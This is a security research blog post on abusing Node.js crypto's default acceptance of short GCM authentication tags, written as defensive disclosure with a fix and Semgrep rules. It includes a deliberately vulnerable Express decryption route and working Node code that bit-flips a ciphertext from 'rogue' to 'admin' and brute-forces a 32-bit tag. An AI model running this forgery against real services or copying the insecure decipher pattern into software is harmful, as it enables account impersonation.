{"aid": "40075878", "title": "Abusing insecure defaults: Forging GCM ciphertexts for the Node.js crypto module", "url": "https://www.securesystems.de/blog/forging_ciphertexts_under_Galois_Counter_Mode_for_the_Node_js_crypto_module/", "domain": "securesystems.de", "votes": 1, "user": "diffieCult", "posted_at": "2024-04-18 13:17:01", "comments": 0, "source_title": "Abusing insecure defaults: Forging ciphertexts under Galois Counter Mode for the Node.js crypto module", "source_text": "Abusing insecure defaults: Forging ciphertexts under Galois Counter Mode for\nthe Node.js crypto module\n\nBack to the SSE Blog\n\n# Abusing insecure defaults: Forging ciphertexts under Galois Counter Mode for\nthe Node.js crypto module\n\nThe robustness principle postulates that when accepting input, you should be\nliberal in what you accept. In cyber security, and in particular in\ncryptography, the opposite is true. This blog post will cover one such\ninstance, where an insecure default renders the Node.js crypto API prone to\nmisuse: I will showcase how the permissibility of different authentication tag\nlengths in the Galois Counter Mode (GCM) NIST specification interacts with the\nunopinionated Decipher class of Node and, if used in its default\nconfiguration, allows an attacker to brute-force authentication tags or even\nkey material, leading to loss of authenticity. Multiple high-profile\norganizations and popular open-source repositories were affected by\nimplementation flaws stemming from the permissive APIs, both in standards and\nsoftware.\n\n## Cryptography basics\n\n> If you are familiar with GCM, feel free to skip this section.\n\nGalois Counter Mode is a block cipher mode of operation that offers\nauthenticated encryption, meaning the output of an encryption is not just the\nusual ciphertext but also an authentication tag that is used to check the\nintegrity (whether the ciphertext has been tampered with).\n\nIf we ignore the authentication part for now, GCM reduces to Counter (CTR)\nmode. Counter mode is effectively a stream cipher in that encryptions of an\nincreasing counter value under the block cipher are concatenated as a\nkeystream and subsequently XORed with the plaintext. While this is handy for\nparallelization and random access, it leads to bitflips in plaintext and\nciphertext mirroring each other. As a consequence, an attacker who knows\nciphertext C1 corresponding to message M1 can reconstruct the keystream KS and\ncraft the ciphertext C2 corresponding to any message M2 of their choosing: C2\n= M2 \u2295 KS = M2 \u2295 (C1 \u2295 M1). This will be important later to allow us to\nconduct targeted impersonation attacks.\n\nVisualisation of Counter Mode: By WhiteTimberwolf, Public Domain,\nhttps://commons.wikimedia.org/w/index.php?curid=26434109\n\nThe particular MAC algorithm that GCM uses internally to calculate the\nauthentication tag is not relevant to the attack. What matters is twofold:\n\n  1. The MAC algorithm effectively has its own key, which derives from the \u201cmain\u201d key. I will reference this as the implicit authentication key later. If it is compromised and a pair of matching initialization vector and ciphertext is known, it can be used to authenticate arbitrary ciphertexts for the same initialization vector. Due to GCM's internals, nonce-reuse\u2014using the same initialization vector twice for two different messages\u2014is sufficient to obtain this implicit authentication key of GCM. This is known as the forbidden attack and the reason why we say GCM fails catastrophically upon nonce-reuse.\n  2. The NIST specification allows a multitude of tag lengths^1. Next to the full length of 128 bits (default), 120, 112, 104, 96, 64, and 32 bits are permitted, though discouraged. Note that the internally calculated authenticator is the same in all cases, the final value just gets truncated to the configured length. Obviously then, the longer the authentication tag, the safer it is.\n\n## GCM with the Node crypto module\n\nUsing Node.js crypto module to encrypt and decrypt data (insecurely)\n\nSince the authentication tag is returned from getAuthTag during encryption and\nset with setAuthTag during decryption in a separate call in the Node API,\ndevelopers will need to store and transmit it alongside but separable from the\nciphertext. As showcased by many real-life applications and the example from\nthe next section, a common solution is to transmit a JSON object incorporating\nauthentication tag, initialization vector, and ciphertext. In the case of a\nweb application, this means that an attacker (client) will be in control of\nall three of these parameters, while the secret key is part of the server\napplication (or stored in an adjacent database/KMS/config).\n\n## Vulnerability exploitation\n\nBelow you find a simple Express server that exposes an example route that\naccepts encrypted data and decrypts it using GCM and the Node crypto module to\nfind out who the user is. I will use this example to show how an exploitation\ncould look in practice. You can run this server yourself if you want to mirror\nthe below attack by installing Node, express, and body-parser.\n\n    \n    \n    const bodyParser = require('body-parser') const { createDecipheriv } = require('node:crypto') // Secret key, usually loaded from config or environment const SECRET_KEY = Buffer.from(\"54cccfd03474484a83d892a24f8a3bd4\", \"hex\") const app = require('express')() app.use(bodyParser.json()) // Decrypt user-provided data to discern who the user is app.post('/whoami', (req, res, next) => { const {encryptedUser, iv, tag} = req.body decipher = createDecipheriv(\"aes-128-gcm\", SECRET_KEY, Buffer.from(iv, \"hex\")) decipher.setAuthTag(Buffer.from(tag, \"hex\")) try { plaintext = Buffer.concat([decipher.update(encryptedUser, \"hex\"), decipher.final()]) const {user} = JSON.parse(plaintext) res.json({user}) } catch { res.json({\"error\": \"Invalid user\"}) } }) app.listen(8080)\n\nThis route may seem (and is) very artificial, but conceptually, this is how\nyou would implement authentication cookies (as was the case in the cookie-\nsessions library that was deprecated after my disclosure) if you based them on\nauthenticated encryption instead of signatures. Generally, the case of a\nclient sending encrypted data whose underlying plaintext it does not control\nto a server that in turn decrypts and acts upon it, can reasonably occur for\nencrypted session state, JSON Web Encryption (JWE) in particular, or device\nattestation. I found implementation flaws and resulting vulnerabilities in all\nof these categories.\n\nLet's look at how the above implementation fails to adequately protect the\nintegrity of the plaintext underlying the ciphertext.\n\n### Exploitation of short authentication tags\n\nAs foreshadowed in the cryptography basics section, an attacker can provide a\nvery short authentication tag (i.e., 32 bits). In our example case, the very\nstructure of the input defines and allows changing the authentication tag.\nSometimes the authentication tag is parsed from the input in more intricate\nways (see the Other variants section below), but conceptually the same logic\napplies.\n\nWhile the chances for successful decryption are still low as there is only one\ncorrect MAC and thus only one correct 32-bit prefix of the MAC, this is within\nrange of brute-force attacks. As an attacker, we can often do a lot more\nnefarious things than simply guessing the authentication tag for a random\nmessage, though. Usually, the attacker knows or can guess (parts of) the\nstructure of the ciphertext, e.g., because it is specified as part of public\ndocumentation. Then, targeted forgeries are possible.\n\nIn the above example, let us (the attacker) have a valid user rogue on the\nserver, for which we have valid authentication data:\n\n    \n    \n    { \"encryptedUser\": \"0ba4137d05b7676bfb117161e70d763e\", \"iv\": \"6acb3d197fe9f39d89bf94f1\", \"tag\": \"40707614424cc689e49bddf919d7f649\" }\n\nWe can check this using\n\n    \n    \n    curl -X POST localhost:8080/whoami -H \"Content-Type: application/json\" --data '{ \"encryptedUser\": \"0ba4137d05b7676bfb117161e70d763e\", \"iv\": \"6acb3d197fe9f39d89bf94f1\", \"tag\": \"40707614424cc689e49bddf919d7f649\" }'\n\nwhich returns {\"user\":\"rogue\"}. Assuming this is the structure that underlies\nthe encryptedUser field, we can maul it surgically due to the Counter mode\n(CTR) underpinning GCM:\n\n  1. We find the ciphertext positions that correspond to the attacker's username, rogue.\n  2. We want to change the ciphertext so that it corresponds to a plaintext with a different user, admin. Since the plaintext is the XOR of a keystream and the ciphertext, any change we XOR into the ciphertext will be reflected in the underlying plaintext. Hence, if we compute the XOR of the attacker's and victim's usernames, we can XOR that value with the ciphertext positions from step 1. The resulting ciphertext now corresponds to a plaintext with the victim's username.\n  3. Now, we utilize the authentication tag length vulnerability to brute-force the authentication tag for the forged ciphertext. Using the triple of the original initialization vector, forged ciphertext, and brute-forced authentication tag, we can now impersonate the target victim.\n\nSubstitution of usernames in data encrypted under Counter mode\n\nBelow is the Node code to forge the ciphertext and, subsequently, to brute-\nforce the correct authentication tag for this forged ciphertext:\n\n    \n    \n    function bufferXor(buf1, buf2) { buf = Buffer.alloc(buf1.length) for (let i = 0; i < buf1.length; i++) { buf[i] = buf1[i] ^ buf2[i] } return buf } // Ciphertext and IV from attacker's account encryptedUser = Buffer.from(\"0ba4137d05b7676bfb117161e70d763e\", \"hex\") iv = \"6acb3d197fe9f39d89bf94f1\" // Step 1: Divide encrypted object expectedIndexUsername = `{\"user\":\"`.length expectedIndexUsernameEnd = expectedIndexUsername + \"rogue\".length encryptedPrefix = encryptedUser.slice(0, expectedIndexUsername) encryptedUserName = encryptedUser.slice(expectedIndexUsername, expectedIndexUsernameEnd) encryptedSuffix = encryptedUser.slice(expectedIndexUsernameEnd) // Steps 2: Substitute known username rogue by victim username admin in the encrypted object userNameXor = bufferXor(Buffer.from(\"rogue\"), Buffer.from(\"admin\")) forgedUserName = bufferXor(encryptedUserName, userNameXor) forgedUser = Buffer.concat([encryptedPrefix, forgedUserName, encryptedSuffix]).toString(\"hex\") // Steps 3: Brute-force the authentication tag async function bruteForce() { tagGuess = Buffer.alloc(4) for (let i = 0; i < 2**32; i++) { tagGuess.writeUInt32BE(i) forgePayload = {encryptedUser: forgedUser, iv, tag: tagGuess.toString(\"hex\")} res = await fetch(\"http://localhost:8080/whoami\", { method: \"POST\", headers: {\"Content-Type\": \"application/json\"}, body: JSON.stringify(forgePayload), }) const {user} = await res.json() if (user) { return {user, tag: tagGuess.toString(\"hex\")} } } } bruteForce().then(forgery => {console.log(`Logged in as ${forgery.user} for tag ${forgery.tag}`)})\n\nWhen running the above, we receive Logged in as admin for tag 000004ee. If\nthis mechanism was used for authentication, we would be able to impersonate\nthe admin account.\n\n### Recovery of key material\n\nWe got lucky^2 this time, as 000004ee is quite an early tag in our search.\nUsually, we expect on average 2^31 attempts, with which we will be able to\nobtain the correct 32-bit prefix. While that is practical, these are still\nquite a lot of requests for a single forgery. Is it possible to improve on the\nattack? It is, at least in the long run!\n\nUsing the brute-forced 32 bits we just obtained, we can repeat the process for\nguessing the authentication tag's 64-bit prefix in another 2^31 attempts.\nRepeating it a few more times for the remaining allowed authentication lengths\n(96, 104, 112, 120, 128), the total expected number of guesses to obtain the\nfull valid authentication tag is 3 * 2^31 + 4 * 2^7 < 2^33.\n\nThis way, we can create the complete authentication tag for any message\nwithout actually knowing the secret key. Then, we can forge a second message\nfor the same initialization vector with the same process for a combined\nexpected number of guesses of less than 2^34 in total^3. Afterward, we can\napply the forbidden attack from the cryptography basics section to recover the\nimplicit authentication key. Thereafter, we can authenticate arbitrary\nciphertexts (for the same initialization vector) without any more guessing.\n\n### Other variants\n\nWhile the above variant of parsing and accepting arbitrary values of\ninitialization vector, authentication tag, and ciphertext from an attacker is\nstraight-forward, I identified more (often weaker) variants of the above\nvulnerability at clients and in open-source repositories, where the parsing of\ntransmitted data allows similar exploits. Here are some more examples where\nthe creation of a Decipher object and its calls are subsumed by decrypt, for\nbrevity's sake:\n\n    \n    \n    parts = input.split('.') iv = parts[0] auth = parts[1] ciphertext = parts[2] plaintext = decrypt(key, iv, auth, ciphertext)\n\nThis is a common equivalent of the example from above; only the representation\ndiffers.\n\n    \n    \n    iv = input.slice(0, 12) auth = input.slice(12, 28) ciphertext = input.slice(28) plaintext = decrypt(key, iv, auth, ciphertext)\n    \n    \n    iv = getIVFromAmbientContext() ciphertext = input.slice(0, -16) auth = input.slice(-16) plaintext = decrypt(key, iv, auth, ciphertext)\n\nWhile usually not relevant in practice, these patterns allow forging the empty\nmessage as input.slice(\u00b1X) and input.slice(0, \u00b1X) of a Buffer input of size at\nmost X will result in an empty Buffer instead of an error.\n\n    \n    \n    length = input.length ciphertext = input.slice(0, length - 16) auth = input.slice(length - 16) // in this case iv came from the context plaintext = decrypt(key, iv, auth, ciphertext)\n\nThis instance was even more interesting (probably more in an academic sense)\nsince it allows forgeries only for very short ciphertexts as an input of at\nleast 16 bytes would always lead to a 16-byte authentication tag. However, if\ninput.length < 16, then the slicing goes wrong:\n\n  * Data length 4 \u2192 ciphertext = input.slice(0, -12) = [], auth = input.slice(-4) = input\n  * Data length 8 \u2192 ciphertext = input.slice(0, -8) = [], auth = input.slice(-8) = input\n  * Data length 12 \u2192 ciphertext = input.slice(0, -4) = input[0:8], auth = input.slice(-4) = input[8:12]\n\nLengths 4, 8, and 16 would have allowed to recover the MAC for the empty\nmessage in an expected 2 * 2^31 + 2^63 guesses, while lengths 12 and 24 would\nhave allowed to recover the MAC for an arbitrary 8-byte ciphertext in 2^31 +\n2^95 guesses. While the latter is not practical, the subtlety of the bug,\nstemming from both the slicing producing unexpectedly short authentication\ntags for different ciphertexts and the Node crypto API accepting these, made\nmy day as a cryptography reviewer.\n\n## Vulnerability fix\n\nFortunately, fixing the vulnerability is quite simple: The createDecipheriv\nfunction accepts an authTagLength option, which is optional for GCM. With its\nhelp, the allowed length can be specified to prevent shorter-than-intended\nauthentication tags from being passed to the Decipher object.\n\n> In GCM mode, the authTagLength option is not required but can be used to\n> restrict accepted authentication tags to those with the specified length.\n> documentation\n    \n    \n    decipher = createDecipheriv(\"aes-256-gcm\", SECRET_KEY, iv, {authTagLength: 16}) decipher.setAuthTag(Buffer.alloc(4)) // Uncaught TypeError: Invalid authentication tag length: 4\n\nTo help developers and companies detect vulnerable usage of the Node crypto\nmodule, I wrote several rules for Semgrep, in particular for the vulnerability\nshown in this blog. They can be found in this PR and hopefully soon in the\nSemgrep registry.\n\nFinding and fixing vulnerabilities is a great thing, but eradicating\nvulnerabilities outright is even better. After this issue was raised back in\n2017 and the possibility to fix it was introduced, the unsafe behaviour has\nnow been deprecated in Node\u2019s main branch, which will hopefully help spread\nawareness^4.\n\n## In the wild\n\nAfter initially finding a variant of the vulnerability at a client, I set out\nto discover its prevalence among the open-source communities. To find public\ninstances of API misuse, I searched GitHub for related terms such as the\nstring constants aes-128-gcm, aes-192-gcm, and aes-256-gcm and invocations of\nNode's createDecipheriv. I found an abundance of projects, frameworks, and\nlibraries using GCM, and an astonishing amount of these misused the Node\ncrypto API.\n\nWith these searches, I found an aggregate of 41 repositories^5 with at least\n100 GitHub Stars that actually use the crypto module to perform decryptions\nusing GCM. There are more projects that only mirror the Node API, only encrypt\nusing GCM, or use Node for benchmarking or non-production use, such as CTF\nwrite-ups or projects with less than 100 stars, which I (mostly) left out of\nmy analysis. Of these 41 repositories, only 7 were completely safe in their\nuse of GCM, with some using the documented authTagLength option and some using\na custom check to enforce a length of 16 bytes on the authentication tag. The\nremaining 34 repositories were split into three groups:\n\n  * 19 repositories were affected in a mostly theoretic sense only, i.e., an attacker could brute-force the authentication tag for the empty message.\n  * 12 repositories were affected by the main misuse described above, which leaves them vulnerable to forgery and key recovery attacks.\n  * 3 repositories failed to check the authentication tag at all, missing the final call on the Decipher object.\n\nWhile the impact is certainly limited in practice due to the sheer amount of\nbrute force that is necessary and sometimes by the use case (for example, a\nCLI application that requires manual interaction by a victim user for each\nattempt will realistically not come close to 2^5 guesses, much less to 2^32),\nthe ubiquity of the misuse is still staggering. It highlights once more that\nsecure defaults, in particular in cryptography, are needed to keep\napplications\u2014and users\u2014safe.\n\nAssessing the impact in each case, I attempted a coordinated vulnerability\ndisclosure with 11 projects. Most findings pertained to some form of session\nor authentication token, such as those in our example, which would have\nallowed user impersonation. While some maintainers were as fast as fixing the\nvulnerability within 3 hours of disclosure \ud83c\udf89\ud83d\udd0f others did not respond or\nrejected the finding \ud83d\ude22\n\n## Conclusion\n\nI have demonstrated an insecure default in the Node crypto module, which\ncommonly leads to vulnerable applications. Of high-profile GitHub projects\nusing the API, significantly more misuse the API than use it correctly. Other\nauthenticated encryption modes in the same module are secure by default,\nshowcasing that implementing secure defaults is a choice. This highlights once\nmore that (in)secure defaults have a strong impact on the ecosystem's overall\nsecurity, especially in cryptographic APIs, where the average user is no\nsubject matter expert and where even subtle misconfiguration can invalidate\nany security guarantees.\n\n## Footnotes\n\n  1. NIST recently announced an upcoming revision of its SP 800-38D, which will forbid authentication tag lengths of less than 96 bit. \u21a9\n\n  2. Yes, I cheated for sake of runtime. \u21a9\n\n  3. Additionally, a paper by Ferguson improves on the estimated number of guesses for both the initial forgery and key recovery because, due to GCM's internals, its short authentication tags are even weaker than would be expected. The improvement is proportional to a known ciphertext's size: for a ciphertext of 2^(l+1) blocks, the estimated guesses for the initial forgery are reduced to 2^32-l. This leads to noticeable speed gains even for moderate lengths, though longer ciphertexts seem to be uncommon in scenarios that lend themselves to exploitation in practice. \u21a9\n\n  4. Fixing the issue by making the API secure-by-default is technically a breaking change, so cannot be integrated in a regular release. \u21a9\n\n  5. There might be even more repositories as code search is limited to 100 results for a particular search term. \u21a9\n\nTeetje Stark\n\nTeetje is a Security Expert at SSE. He is part of our Defensive Security Team.\nAs such he helps create secure applications both in design and implementation\nphase. He specializes in and is passionate about cryptography.\n\nFollow SSE on:\n\nPrivacyImprint\n\n\u00a9 SSE \u2013 Secure Systems Engineering GmbH\n\n", "frontpage": false}
